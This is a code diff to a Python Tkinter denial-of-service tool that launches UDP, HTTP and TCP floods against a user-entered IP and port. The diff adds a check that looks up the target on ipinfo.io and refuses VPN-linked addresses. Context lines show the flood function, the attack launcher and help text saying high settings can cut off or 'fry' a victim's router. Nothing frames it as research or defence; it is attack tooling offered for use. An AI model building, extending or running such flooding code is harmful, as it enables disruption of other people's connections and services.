@@ -3,10 +3,23 @@ import threading
 import random
 import requests
 import tkinter as tk
-from tkinter import scrolledtext
+from tkinter import scrolledtext, messagebox
 
 print("github.com/laladaban33")
 
+# Function to check if the IP is from a VPN
+def is_vpn(ip):
+    try:
+        # Query an external API to check if the IP is a VPN
+        response = requests.get(f"https://ipinfo.io/{ip}/json")
+        data = response.json()
+        
+        # If the IP is associated with a VPN provider, this will check if VPN is detected
+        if 'org' in data and ('VPN' in data['org'] or 'Proxy' in data['org']):
+            return True
+        return False
+    except requests.RequestException:
+        return False
 
 def udp_flood(target_ip, target_port, strength, console):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -62,8 +75,8 @@ def show_info():
         "Small: 10-50 - Slightly slows internet connection\n"
         "Medium: 100-500 - Can slow down or even shut off connection\n"
         "High: 1000+ - Might fry your router\n"
-	"UDP Flood - Multiplies byte size/packet\n"
-	"HTTP/TCP Flood - How many bots sending packets"
+        "UDP Flood - Multiplies byte size/packet\n"
+        "HTTP/TCP Flood - How many bots sending packets"
     )
     console.insert(tk.END, f"\n{info_text}\n")
     console.see(tk.END)
@@ -73,7 +86,12 @@ def start_attack():
     target_port = int(port_entry.get())
     method = method_var.get()
     strength = int(strength_entry.get().split('-')[-1])
-    
+
+    # Check if the target IP is a VPN
+    if is_vpn(target_ip):
+        messagebox.showerror("VPN Detected", "Please turn off your VPN. We don't want VPN companies to be held responsible for YOUR actions.")
+        return
+
     console.insert(tk.END, f"Starting {method} attack on {target_ip}:{target_port} with strength {strength}\n")
     
     if method == "UDP":
